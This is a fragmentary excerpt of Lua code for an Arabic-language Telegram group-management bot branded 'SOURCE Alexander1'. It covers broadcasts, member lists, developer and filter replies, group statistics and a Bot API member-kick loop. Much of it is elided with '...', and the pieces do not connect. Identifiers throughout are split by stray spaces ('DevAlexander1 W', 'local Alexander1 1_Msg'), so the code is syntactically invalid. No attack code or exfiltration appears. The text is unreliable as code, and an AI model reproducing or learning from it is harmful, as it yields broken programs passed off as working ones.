if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevAlexander1 W(msg) then 
...
},function(ta,Alexander1 )
local t = "\nツ قائمة الاعضاء \n SOURCE Alexander1²\n"
x = 0
local list = Alexander1 .members_
for k, v in pairs(list) do
x = x + 1
...
if text == ("مسح ردود المطور") and DevAlexander1 W(msg) then 
...
if text == ("ردود المطور") and DevAlexander1 W(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n☤ قائمة ردود المطور \n SOURCE Alexander1²\n"
for k,v in pairs(list) do
...
if text == 'اضف رد عام' and DevAlexander1 W(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'مسح رد عام' and DevAlexander1 W(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
"اكثر المتابعين لك في برنامج اي"
"كلمة لشخص زعلك ف حياتك"
"ترتبطي بمين باندا ولا بويكا"
"ترتطي بمين باندا ولا الكومندا"
"اسم اخر شخص اتعرفت عليه في التيلجرام"
"افضل يوم ف حياتك"
}
...
if text == 'تفعيل المغادره' and DevAlexander1 W(msg) then   
...
if text == 'تعطيل المغادره' and DevAlexander1 W(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n☤ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Alexander1 ')..') '
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'vp_zo')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
Alexander1 dx(msg.chat_id_, msg.id_, '☤ ايدي المجموعة » ( '..msg.chat_id_..' )\n☤ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n☤ عدد المحظورين » ( *'..data.kicked_count_..' )*\n☤ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
if text == 'استعاده الاوامر' and DevAlexander1 W(msg) then
...
zx = JSON.decode(zh)
t = "\n☤ قائمه الزخرفه \nٴ☤  SOURCE Alexander1²☤○ٴ \n"
i = 0
for k,v in pairs(zx.ok) do
i = i + 1
t = t..i.."-  "..v.." \n"
end
send(msg.chat_id_, msg.id_, t..'ٴ☤  SOURCE Alexander1²☤○ٴ\n☤ [[˹ SOURCE Alexander1.](http://t.me/vp_zo)](t.me/vp_zo)➢ ')
end
...
Alexander1  = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Alexander1 )
...
--------------------------------------------------------------------------------------------------------------
SourceAlexander1 (data.message_,data)
plugin_Alexander1 (data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local revorb0t = database:get(bot_id.."Alexander1 1:Add:Filter:Rp2"..text..result.chat_id_)   
if revorb0t then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"☤ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n☤ ["..revorb0t.."] \n") 
...
------------------------------------------------------------------------
if text then
local Alexander1 1_Msg = database:get(bot_id.."Alexander1 1:Add:Filter:Rp2"..text..result.chat_id_)   
if Alexander1 1_Msg then    
send(msg.chat_id_, msg.id_,"☤ "..Alexander1 1_Msg)
